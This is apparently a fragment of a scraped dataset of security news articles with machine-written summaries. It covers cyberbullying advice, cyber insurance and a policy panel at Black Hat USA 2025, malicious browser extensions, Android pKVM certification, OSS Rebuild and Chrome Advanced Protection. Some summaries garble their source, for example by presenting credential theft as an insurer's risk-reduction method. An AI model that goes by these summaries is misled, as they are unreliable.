Anxiety and apprehension thrive in the silent spaces between our lives. It’s important that your kids know they can come to you with any problems they may be experiencing, without fear of judgement or reprisals.\nFor the same reason, it often pays not to intrude too much into their personal lives, unless you have cause to believe something serious is going on. Asking open-ended questions like “how’s everything going?” may be a better bet than “are you being bullied?” And try and find a time and a place where you won’t be overheard. Embarrassment is a strong emotion among teens and a formidable barrier to having honest conversations.\nThere are also some more proactive things you can do to mitigate the risk of cyberbullying. Talk to your kids about online privacy and safety. Take time to understand what apps they use and make sure the settings are age-appropriate and privacy enhanced. Be sure they know the risks of hanging out on social media sites and gaming platforms, and of threats like\nsextortion and deepfake nudes\n. They need to develop a healthy scepticism of anyone they interact with online, especially if they’ve not met in person. Unsolicited friend requests from strangers should be dismissed outright. It might help as part of this to understand exactly who your children’s friends are on- and offline.\nA more hands-on option may be to adjust your kids’ smartphone settings to limit access to certain content and screentime or install parental monitoring software. If you’re keen to do so, remember to explain first to your child why you’re doing it. Fail to get buy in and your plans may come unstuck at the hands of a determined teen.\nA worst-case scenario\nIf you discover your child is being bullied online, don’t panic. Talk it through calmly, find out exactly what’s happening and how it’s making them feel. And don’t overreact. What you need to do is show your child how to block the bully, then screenshot and keep any and all evidence. Report the incident to the relevant online platforms. And, if relevant, arrange a meeting with your school.\nBullying is unfortunately a part of many children’s lives. And with access to mobile devices, the bullies can reach further into your home than they ever used to. But you also have some powerful tools at your disposal: empathy, patience, tech know-how and love.\nBe observant. Pay attention to what your kids are going through. Give them space and support. Teach them how to use and configure their tech properly. And be there with a plan and a hug if things take a turn for the worse.\nFurther resources\nThe following websites offer advice and contacts for counseling services:\nCyberbullying Research Center\n(United States)\nNational Bullying Helpline\n(United Kingdom)\nKidshelpline\n(Australia)\nNetsafe\n(New Zealand)\nCyber B.A.A.P.\n(India)\nBully-Free\n(Singapore)\nCybersmile\n(various countries)",

      "content": "Posted by Dave Kleidermacher, VP Engineering, Android Security & PrivacyToday marks a watershed moment and new benchmark for open-source security and the future of consumer electronics. Google is proud to announce that protected KVM (pKVM), the hypervisor that powers the Android Virtualization Framework, has officially achievedSESIP Level 5 certification. This makes pKVM the first software security system designed for large-scale deployment in consumer electronics to meet this assurance bar.Supporting Next-Gen Android FeaturesThe implications for the future of secure mobile technology are profound. With this level of security assurance, Android is now positioned to securely support the next generation of high-criticality isolated workloads. This includes vital features, such as on-device AI workloads that can operate on ultra-personalized data, with the highest assurances of privacy and integrity.This certification required a hands-on evaluation byDekra, a globally recognized cybersecurity certification lab, which conducted an evaluation against theTrustCB SESIP scheme, compliant toEN-17927. Achieving Security Evaluation Standard for IoT Platforms (SESIP) Level 5 is a landmark because it incorporates AVA_VAN.5, the highest level of vulnerability analysis and penetration testing under the ISO 15408 (Common Criteria) standard. A system certified to this level has been evaluated to be resistant to highly skilled, knowledgeable, well-motivated, and well-funded attackers who may have insider knowledge and access.This certification is the cornerstone of the next-generation of Android’s multi-layered security strategy. Many of the TEEs (Trusted Execution Environments) used in the industry have not been formally certified or have only achieved lower levels of security assurance. This inconsistency creates a challenge for developers looking to build highly critical applications that require a robust and verifiable level of security. The certified pKVM changes this paradigm entirely. It provides a single, open-source, and exceptionally high-quality firmware base that all device manufacturers can build upon.Looking ahead, Android device manufacturers will be required to use isolation technology that meets this same level of security for various security operations that the device relies on. Protected KVM ensures that every user can benefit from a consistent, transparent, and verifiably secure foundation.A Collaborative EffortThis achievement represents just one important aspect of the immense, multi-year dedication from the Linux and KVM developer communities and multiple engineering teams at Google developing pKVM andAVF. We look forward to seeing the open-source community and Android ecosystem continue to build on this foundation, delivering a new era of high-assurance mobile technology for users.",
      "summary": "The achievement of SESIP Level 5 certification for Android's pKVM marks a significant milestone in the realm of open-source security and consumer electronics, particularly with its application in supporting next-generation high-criticality isolated workloads. This certification not only signifies a robust level of security against highly skilled attackers but also represents a substantial effort from the Linux and KVM developer communities, Google's engineering teams, and multiple contributors to the Android Virtualization Framework (AVF). The pKVM hypervisor, which powers AVF, has become the first software designed for large-scale deployment in consumer electronics to meet this assurance bar. This certification is crucial as it ensures that Android devices can securely support next-generation features such as on-device AI workloads reliant on ultra-personalized data with high assurances of privacy and integrity.",

      "url": "https://www.welivesecurity.com/en/business-security/black-hat-usa-2025-cyber-insurance-premium/",
      "published_date": "2025-08-08",
      "content": "When a cyber risk insurance quote lands on your desk and the premium is sky high, it’s natural to assume that the insurer is judging your environment to be high risk. So, when the next quote lands and is more acceptable, does it mean they viewed your risk differently?\nAccording to one of the many cyber insurance presentations at\nBlack Hat USA 2025\n, the reason may not be so obvious: it may be that the insurer is limiting its risk exposure to a product or service you use, rather than finding a risk within your environment.\nTo be more specific, an insurer may wish to limit its exposure to a certain vendor in your supply chain. For example, imagine they decide that acceptable risk is for only 60% of their policyholders to use product X. If your business were to push them over this limit, they may just price themselves out of your business with a high quote, rather than declining you.\nThe risk, therefore, is not with your environment – it’s with the supplier. In fact, there may not even be a specific risk with them. It could just be that a risk limit set by the insurer has been reached.\nAs consumers, we can see this in practice. When I use a car insurance comparison site, the premium amounts vary by as much as 200%. Yet my risk is the same to all insurers, and it’s likely that some insurers are capping their risk exposure to certain car manufacturers by pricing themselves out of the market.\nAs the cyber insurance and cybersecurity industries become further entwined, the data-based insights from insurers’ claims can – and should – improve cybersecurity posture for everyone involved, not just the insured. As a cybersecurity professional, I assume that multi-factor-authentication is default ‘ON’ for any company providing their employees remote access via an SSL VPN.\nMy assumption, though, is far from correct. A statistic shared during a presentation revealed that in the first six months of 2025, 45% of new cyber claims were a result of an SSL VPN lacking MFA. This is shocking for two reasons: firstly, why do insurers provide policies to companies that have no MFA given the risk of a claim, and secondly, why would any company not secure their SSL VPN with MFA?\nWhat claims data reveals\nAccording to data presented by Coalition, 55% of all ransomware attacks are initiated through a perimeter security device. And in claims where the method used is known, there is a clear winner: credential theft.\nWhile ransomware dominates the discussion, there was good news presented. Coalition’s efforts to claw back funds from fraudulent transfers do have some success. In 2024, they managed to recover $31 million, using various methods that include alerting government contacts, obtaining injunctions to freeze funds and engaging specialized crisis response experts. This claw-back averages at $278,000 per event, with 24% of all events gaining some claw-back and 12% of events getting the whole amount back.\nThe cyber insurance industry continues its efforts to reduce its exposure to claims, and the presentations from various insurers demonstrate that they are going to new lengths to achieve this. Depending on their policy, the insured can now benefit from various services provided by the insurer, including customized cyber threat intelligence based on the insured’s specific environment. This is complemented by monitoring and alerting their clients when a new vulnerability is posted to the CVE database; specifically, the insurer will alert the insured where they know the software or hardware is in use and provide guidance on the expected patching timeline.\nThis proactive approach to reduce risk even extends on to the dark web, where insurers may purchase compromised credentials or, in some instances, acquire zero-day vulnerabilities to protect their insured clients and, even more importantly, reduce the insurer’s financial risk.\nAs the insurance and cybersecurity industries continue to overlap, the question for me is: just how far will the overlap go?",
      "summary": "The article discusses the relationship between cyber insurance premiums and cybersecurity risks, highlighting that insurers may adjust premiums based on their risk exposure rather than assessing the actual risk within a company's environment. It points out that premium differences might be due to limitations set by insurers on certain vendors or products used by companies, such as SSL VPN without multi-factor authentication (MFA). The article also mentions that cyber insurance claims data can provide insights for improving cybersecurity posture and suggests that MFA should be a default setting for remote access via SSL VPN. It further discusses the role of cyber insurance in reducing exposure to ransomware attacks through methods like credential theft, with some success in clawing back funds from fraudulent transfers.",

      "published_date": "2025-08-07",
      "content": "If you put a group of CISOs in a room, they are all likely to wait for one of them to declare they have the answer, the silver bullet, that solves the issue of the day. In reality, however, what needs to happen is that all the CISOs combined have a fragment of the answer and need to piece them together to create the answer to the issue.\nThe above was a comment from a policy panel at\nBlack Hat USA 2025\n. The comment has merit, as no single vendor, service provider, individual or another entity can resolve the cybersecurity conundrum. It truly is a team sport that requires all those involved to play an active role.\nThe issue is breaking down the barriers of sharing that may exist between companies that could be competitors. In physical security situations, companies do share information; for example, in retail, it’s common for store security guards to collaborate with neighboring guards to warn of a threat. However, in cybersecurity, obscurity can be seen as security and the threat is never shared.\nAs the panel was dominated by policy-makers, or those involved in advising policy-makers, they credited improved cybersecurity posture to policy. I am not sure I subscribe to this.\nIn part, it may be true, but improved cybersecurity posture is probably a result of financial risk. The cost of a cyber incident continues to increase, and regulatory fines that result from policy breaches (if the policy has a financial penalty component) are only one line item in the overall costs. The business risk of a cyber incident is no longer just on the desk of the IT and cybersecurity team – it’s a board- or C-level issue and is about ensuring the business can withstand the financial loss incurred should there be a cyber incident, and each company has a different appetite for risk. Financial risk, including any regulatory issues, is often\nmitigated through insurance\n, and cyber risk is no different to the more traditional insurances a company holds, which is why the cyber risk insurance market continues to grow.\nAI to the rescue\nThe panel also discussed the use of AI by defenders and adversaries. For defenders, it’s imperative to use AI as employing enough threat hunters to undertake the task without the use of AI would be near impossible. Another interesting comment from the panel concerned AI tools that provide confirmation of\ncompliance with regulations and policy\n.\nAs the number of policies continues to rise, so does the burden of managing compliance. AI tools that manage compliance and the continual changes in the compliance requirements are fast becoming the only way some companies may be able to manage their compliance status.\nHowever, what if the AI model being used to calculate compliance with the relevant policy gets it wrong? Will a regulator cut the company some slack as they thought they were compliant, or will the penalty be levied regardless of who or what is to blame? For me, this is another instance where AI needs to become a tool that complements human expertise and should not be trusted as the only source.\nThe takeaway from the panel session for me is that there will continue to be more policy and compliance requirements. With the change in administration still being relatively new, it’s a pivotal moment. No one really knows the direction policy may take and whether it will be simplified or simply added to. The reason for more policy could be seen as a declaration that industry has failed to self-regulate and that a stronger security posture will only be achieved through penalties for non-compliance.\nThe final point of the panel discussion mentioned multi-factor-authentication (MFA), and the panel agreed that a whole-nation approach is needed to ensure all businesses adopt MFA as a baseline standard. And I could not agree more: there really is no excuse for not deploying MFA.\nTo learn more about how your organization can be compliant with specific regulations, head over to ESET's\nCybersecurity Compliance for Business\npage.",

      "published_date": "2025-07-29",
      "content": "What would we do without the web browser? For most of us, it’s our gateway to the digital world. But browsers are such a familiar tool today that we’re in danger of giving them a free ride. In fact, there are plenty of rogue extensions masquerading as legitimate ad blockers, AI assistants, or even security tools that are designed to steal our data, send us to malicious sites and flood our screen with popups. For example, earlier this year, a\nmalicious campaign was uncovered\nthat may have impacted dozens of extensions and compromised nearly three million users.\nNext time you’re thinking about downloading a web browser add-on, think through the following risks.\nWhy extensions matter\nBrowser extensions are an increasingly popular vehicle for threat actors. They give attackers access to a vast amount of sensitive information, with people often trusting these add-ons, especially if they’re downloaded from official sources. Also, extensions provide multiple avenues for monetization and malicious activity and generally give attacks a better chance of success and are a threat also in corporate settings, where they may often stay under the radars of security teams and tools.\nHowever, by installing and granting an extension permissions, you could unwittingly be enabling malicious actors to access your most sensitive data – everything from browsing history to saved logins and session cookies, which could be abused to\nhijack your accounts\n.\nWhen browsers go bad\nA\n2023 risk assessment\nof 300,000 browser extensions and third-party OAuth applications used in corporate environments revealed that half (51%) of the former were high risk and could potentially have caused “extensive damage.”\nSo how could they end up on your machine? Malware may be hidden in legitimate-looking browser extensions like those purporting to be ad blockers or PDF converters or even security enhancements. They could be packaged up and placed on browser stores for unwitting users to download, bundled with other software, shared through deceptive links or uploaded to platforms outside your official web store, where hackers rely on users “sideloading” in order to target them.\nSideloading is particularly dangerous because third-party stores don’t feature the kind of security reviews and other checks that official marketplaces have in place. That means they’re more likely to feature harmful add ons spoofed to appear as if legitimate.\nAlternatively, threat actors could hijack or acquire a legitimate extension and use it to send malicious updates to its entire user base. Sometimes, extensions can seem legitimate, but on activation\nwill be programmed to install\nnew payloads with malicious capabilities.\nRilide Stealer posing as a Chrome browser extension (source:\nESET Threat Report H1 2024\n)\nWhat can malicious extensions do?\nThe nefarious actions run the gamut and include:\nStealing data\n, including usernames and passwords, browsing history, session cookies (which can be used to access your accounts without needing a password) and financial information. This may be sourced from your clipboard, browser or obtained via keylogging as you type it in. The end goal is usually to either sell that data on the dark web, or use it directly to hijack accounts and commit identity fraud.\nDirecting you to malicious or risky websites\nthat may harbor malware including infostealers and banking Trojans. Other sites may be spoofed to appear as if a legitimate brand, but are actually designed to harvest your personal and financial information and/or logins.\nInjecting unwanted ads and possible malware\ninto your browsing experience. Ads could be monetized by threat actors, while malware may be designed to steal credentials or harvest other lucrative personal data for identity fraud.\nBackdooring your browser\nso that they can access your machine at any time in the future.\nMining for cryptocurrency\nwithout your knowledge, something that can slow down or even wear out your machine completely.\nStaying safe\nTo mitigate these risks, caution is always advised when you’re on the hunt for a new extension. First of all, stick to legitimate web stores and closely scrutinize any new add-on. That might include checking the developer’s credentials, reading reviews of the product and searching separately for it to see if it has been connected to any suspicious or malicious behavior in the past. Look closely too at its permissions. If it requests any that seem to go beyond what is needed for the product, it should be a red flag. As is the case with, for example, mobile apps, not many extensions\nshould need access\nto your passwords or browsing data.\nAdditional tips to keep yourself safe include:\nKeep your browser updated so it’s on the latest, more secure version at all times. This means it will be better protected against potential malware.\nSwitch on multi-factor authentication on all your online accounts – that will go a long way toward keeping you safe even if a malicious browser extension does steal your passwords.\nTo make your web browsing experience safer in general, consider using a\nsecured browser mode\nthat is offered together with other security-enhancing features by some security vendors. This mode comes in particularly handy when you perform financial and crypto transactions in your browser.\nEnhanced Safe Browsing in some common web browsers can also help you steer clear of malicious sites.\nImportantly, use security software from a reputable vendor, and perform periodic scans to check for anything suspicious running on your computer. It will go a long way towards preventing you\ndownloading malware from third-party sites\n, or redirecting to a phishing site.\nEvery piece of software we install, no matter how small, comes with an element of trust; indeed, this trust may be particularly significant with browser extensions, as they operate directly within your gateway to the internet. Think carefully about the value or convenience that an extension provides versus the potential risk. Ultimately, the goal is to make informed choices about the add-ons you allow into your digital space. be sure to source your browser extensions and, indeed, all other software from reliable providers.",

      "published_date": "2025-07-21",
      "content": "Posted by Matthew Suozzo, Google Open Source Security Team (GOSST)Today we're excited to announce OSS Rebuild, a new project to strengthen trust in open source package ecosystems by reproducing upstream artifacts. As supply chain attacks continue to target widely-used dependencies, OSS Rebuild gives security teams powerful data to avoid compromise without burden on upstream maintainers.The project comprises:Automationto derive declarative build definitions for existing PyPI (Python), npm (JS/TS), and Crates.io (Rust) packages.SLSA Provenancefor thousands of packages across our supported ecosystems, meeting SLSA Build Level 3 requirements with no publisher intervention.Build observability and verification toolsthat security teams can integrate into their existing vulnerability management workflows.Infrastructure definitionsto allow organizations to easily run their own instances of OSS Rebuild to rebuild, generate, sign, and distribute provenance.ChallengesOpen source software has become the foundation of our digital world. From critical infrastructure to everyday applications, OSS components now account for77%of modern applications. With an estimated value exceeding$12 trillion, open source software has never been more integral to the global economy.Yet this very ubiquity makes open source an attractive target: Recent high-profile supply chain attacks have demonstrated sophisticated methods for compromising widely-used packages. Each incident erodes trust in open ecosystems, creating hesitation among both contributors and consumers.The security community has responded with initiatives likeOpenSSF Scorecard,pypi's Trusted Publishers, andnpm's native SLSA support. However, there is no panacea: Each effort targets a certain aspect of the problem, often making tradeoffs like shifting work onto publishers and maintainers.Our AimOur aim with OSS Rebuild is to empower the security community to deeply understand and control their supply chains by making package consumption as transparent as using a source repository. Our rebuild platform unlocks this transparency by utilizing a declarative build process, build instrumentation, and network monitoring capabilities which, within theSLSA Buildframework, produces fine-grained, durable, trustworthy security metadata.Building on the hosted infrastructure model that we pioneered withOSS Fuzzfor memory issue detection, OSS Rebuild similarly seeks to use hosted resources to address security challenges in open source, this time aimed at securing the software supply chain.Our vision extends beyond any single ecosystem: We are committed to bringing supply chain transparency and security to all open source software development. Our initial support for the PyPI (Python), npm (JS/TS), and Crates.io (Rust) package registries—providing rebuild provenance for many of their most popular packages—is just the beginning of our journey.How OSS Rebuild WorksThrough automation and heuristics, we determine a prospective build definition for a target package and rebuild it. We semantically compare the result with the existing upstream artifact, normalizing each one to remove instabilities that cause bit-for-bit comparisons to fail (e.g. archive compression). Once we reproduce the package, we publish the build definition and outcome viaSLSA Provenance. This attestation allows consumers to reliably verify a package's origin within the source history, understand and repeat its build process, and customize the build from a known-functional baseline (or maybe even use it to generate more detailedSBOMs).With OSS Rebuild's existing automation for PyPI, npm, and Crates.io, most packages obtain protection effortlessly without user or maintainer intervention. Where automation isn't currently able to fully reproduce the package, we offer manual build specification so the whole community benefits from individual contributions.And we are also excited at the potential for AI to help reproduce packages: Build and release processes are often described in natural language documentation which, while difficult to utilize with discrete logic, is increasingly useful to language models. Our initial experiments have demonstrated the approach's viability in automating exploration and testing, with limited human intervention, even in the most complex builds.Our CapabilitiesOSS Rebuild helps detect several classes of supply chain compromise:Unsubmitted Source Code- When published packages contain code not present in the public source repository, OSS Rebuild will not attest to the artifact.Real world attack:solana/webjs (2024)Build Environment Compromise- By creating standardized, minimal build environments with comprehensive monitoring, OSS Rebuild can detect suspicious build activity or avoid exposure to compromised components altogether.Real world attack:tj-actions/changed-files (2025)Stealthy Backdoors- Even sophisticated backdoors like xz often exhibit anomalous behavioral patterns during builds. OSS Rebuild's dynamic analysis capabilities can detect unusual execution paths or suspicious operations that are otherwise impractical to identify through manual review.Real world attack:xz-utils (2024)For enterprises and security professionals, OSS Rebuild can...Enhance metadata without changing registriesby enriching data for upstream packages. No need to maintain custom registries or migrate to a new package ecosystem.Augment SBOMsby adding detailed build observability information to existing Software Bills of Materials, creating a more complete security picture.Accelerate vulnerability responseby providing a path to vendor, patch, and re-host upstream packages using our verifiable build definitions.For publishers and maintainers of open source packages, OSS Rebuild can...Strengthen package trustby providing consumers with independent verification of the packages' build integrity, regardless of the sophistication of the original build.Retrofit historical packages' integritywith high-quality build attestations, regardless of whether build attestations were present or supported at the time of publication.Reduce CI security-sensitivityallowing publishers to focus on core development work. CI platforms tend to have complex authorization and execution models and by performing separate rebuilds, the CI environment no longer needs to be load-bearing for your packages' security.Check it out!The easiest (but not only!) way to access OSS Rebuild attestations is to use the provided Go-based command-line interface. It can be compiled and installed easily:$ go install github.com/google/oss-rebuild/cmd/oss-rebuild@latestYou can fetch OSS Rebuild's SLSA Provenance:$ oss-rebuild get cratesio syn 2.0.39..or explore the rebuilt versions of a particular package:$ oss-rebuild list pypi absl-py..or even rebuild the package for yourself:$ oss-rebuild get npm lodash 4.17.20 --output=dockerfile | \\docker run $(docker buildx build -q -)Join Us in Helping Secure Open SourceOSS Rebuild is not just about fixing problems; it's about empowering end-users to make open source ecosystems more secure and transparent through collective action.

      "content": "Posted by David Adrian, Javier Castro & Peter Kotwicz, Chrome Security TeamAndroid recently announcedAdvanced Protection, which extends Google’sAdvanced Protection Programto a device-level security setting for Android users that need heightened security—such as journalists, elected officials, and public figures. Advanced Protection gives you the ability to activate Google’s strongest security for mobile devices, providing greater peace of mind that you’re better protected against the most sophisticated threats.Advanced Protection acts as a single control point for at-risk users on Android that enables important security settings across applications, including many of your favorite Google apps, including Chrome. In this post, we’d like to do a deep dive into the Chrome features that are integrated with Advanced Protection, and how enterprises and users outside of Advanced Protection can leverage them.Android Advanced Protection integrates with Chrome on Android in three main ways:Enables the “Always Use Secure Connections”setting for both public and private sites, so that users are protected from attackers reading confidential data or injecting malicious content into insecure plaintext HTTP connections. Insecure HTTP represents less than 1% of page loads for Chrome on Android.Enables full Site Isolationon mobile deviceswith 4GB+ RAM, so that potentially malicious sites are never loaded in the same process as legitimate websites. Desktop Chrome clients already have full Site Isolation.Reduces attack surfaceby disabling Javascript optimizations, so that Chrome has a smaller attack surface and is harder to exploit.Let’s take a look at all three, learn what they do, and how they can be controlled outside of Advanced Protection.Always Use Secure Connections“Always Use Secure Connections” (also known as HTTPS-First Mode in blog posts and HTTPS-Only Mode in the enterprise policy) is a Chrome setting that forces HTTPS wherever possible, and asks for explicit permission from you before connecting to a site insecurely. There may be attackers attempting to interpose on connections on any network, whether that network is a coffee shop, airport, or an Internet backbone. This setting protects users from these attackers reading confidential data and injecting malicious content into otherwise innocuous webpages. This is particularly useful for Advanced Protection users, since in 2023, plaintext HTTP wasused as an exploitation vector during the Egyptian election.Beyond Advanced Protection, wepreviously postedabout how our goal is to eventually enable “Always Use Secure Connections” by default for all Chrome users. As we work towards this goal, in the last two years we have quietly been enabling it in more places beyond Advanced Protection, to help protect more users in risky situations, while limiting the number of warnings users might click through:We added a new variant of the setting that only warns on public sites, and doesn’t warn on local networks or single-label hostnames (e.g.192.168.0.1,shortlink/,10.0.0.1). These names often cannot be issued a publicly-trusted HTTPS certificate. This variant protects against most threats—accessing a public website insecurely—but still allows for users to access local sites, which may be on a more trusted network, without seeing a warning.We’ve automatically enabled “Always Use Secure Connections” for public sites in Incognito Mode for the last year, since Chrome 127 in June 2024.We automatically prevent downgrades from HTTPS to plaintext HTTP on sites that Chrome knows you typically access over HTTPS (a heuristic version of theHSTS header), since Chrome 133 in January 2025.Always Use Secure Connections has two modes—warn on insecure public sites, and warn on any insecure site.Any user can enable “Always Use Secure Connections” in the Chrome Privacy and Security settings, regardless of if they’re using Advanced Protection. Users can choose if they would like to warn onanyinsecure site, or only insecure public sites. Enterprises can opt their fleet into either mode, and set exceptions using theHTTPSOnlyModeandHTTPAllowlistpolicies, respectively. Website operators should protect their users' confidentiality, ensure their content is delivered exactly as they intended, and avoid warnings, by deploying HTTPS.Full Site IsolationSite Isolationis a security feature in Chrome that isolates each website into its own rendering OS process. This means that different websites, even if loaded in a single tab of the same browser window, are kept completely separate from each other in memory. This isolation prevents a malicious website from accessing data or code from another website, even if that malicious website manages to exploit a vulnerability in Chrome’s renderer—a second bug to escape the renderer sandbox is required to access other sites. Site isolation improves security, but requires extra memory to have one process per site. Chrome Desktop isolates all sites by default. However, Android is particularly sensitive to memory usage, so for mobile Android form factors, when Advanced Protection is off, Chrome will only isolate a site if a user logs into that site, or if the user submits a form on that site. On Android devices with 4GB+ RAM in Advanced Protection (and on all desktop clients), Chrome will isolateallsites. Full Site Isolation significantly reduces the risk of cross-site data leakage for Advanced Protection users.JavaScript Optimizations and SecurityAdvanced Protection reduces the attack surface of Chrome by disabling the higher-level optimizing Javascript compilers inside V8. V8 is Chrome’s high-performance Javascript andWebAssemblyengine. The optimizing compilers in V8 make certain websites run faster, however they historically also have been a source of known exploitation of Chrome. Of all the patched security bugs in V8 with known exploitation, disabling the optimizers would have mitigated ~50%. However, the optimizers are why Chrome scores the highest on industry-wide benchmarks such asSpeedometer. Disabling the optimizers blocks a large class of exploits, at the cost of causing performance issues for some websites.Javascript optimizers can be disabled outside of Advanced Protection Mode via the “Javascript optimization & security” Site Setting. The Site Setting also enables users to disable/enable Javascript optimizers on a per-site basis. Disabling these optimizing compilers is not limited to Advanced Protection. Since Chrome 133, we’ve exposed this as a Site Setting that allows users to enable or disable the higher-level optimizing compilers on a per-site basis, as well as change the default.Settings -> Privacy and Security -> Javascript optimization and securityThis setting can be controlled by theDefaultJavaScriptOptimizerSettingenterprise policy, alongsideJavaScriptOptimizerAllowedForSitesandJavaScriptOptimizerBlockedForSitesfor managing the allowlist and denylist. Enterprises can use this policy to block access to the optimizer, while still allowlisting1the SaaS vendors their employees use on a daily basis. It’s available on Android and desktop platformsChrome aims for the default configuration to be secure for all its users, and we’re continuing to raise the bar for V8 security in the default configuration byrolling out the V8 sandbox.Protecting All UsersBillions of people use Chrome and Android, and not all of them have the same risk profile. Less sophisticated attacks by commodity malware can be very lucrative for attackers when done at scale, but so can sophisticated attacks on targeted users. This means that we cannot expect the security tradeoffs we make for the default configuration of Chrome to be suitable for everyone.Advanced Protection, and the security settings associated with it, are a way for users with varying risk profiles to tailor Chrome to their security needs, either as an individual at-risk user. Enterprises with a fleet of managed Chrome installations can also enable the underlying settings now. Advanced Protection is available on Android 16 in Chrome 137+.We additionally recommend at-risk users join theAdvanced Protection Program with their Google accounts, which will require the account to use phishing-resistant multi-factor authentication methods and enable Advanced Protection on any of the user’s Android devices. We also recommend users enable automatic updates and always keep their Android phones and web browsers up to date.NotesAllowlisting only works on platforms capable of full site isolation—any desktop platform and Android devices with 2GB+ RAM. This is because internally allowlisting is dependent onorigin isolation.↩",
      "summary": "The article discusses advancements in Chrome's security features for Android users, specifically focusing on Advanced Protection. This feature extends Google's Advanced Protection Program to mobile devices, offering enhanced security settings for individuals at high risk such as journalists, elected officials, and public figures. The integration of Chrome with Advanced Protection includes enforcing 'Always Use Secure Connections' across all sites accessed through the browser, ensuring HTTPS connections are always used unless explicitly bypassed. Additionally, it implements full Site Isolation on mobile devices to isolate websites in separate rendering processes, reducing the risk of data leakage from one site to another. Furthermore, Chrome disables higher-level Javascript optimizers within V8 engine for users in Advanced Protection mode, which helps mitigate known exploits while maintaining performance benchmarks. This tailored approach allows users with different security needs to customize their browsing experience according to their level of vulnerability.",
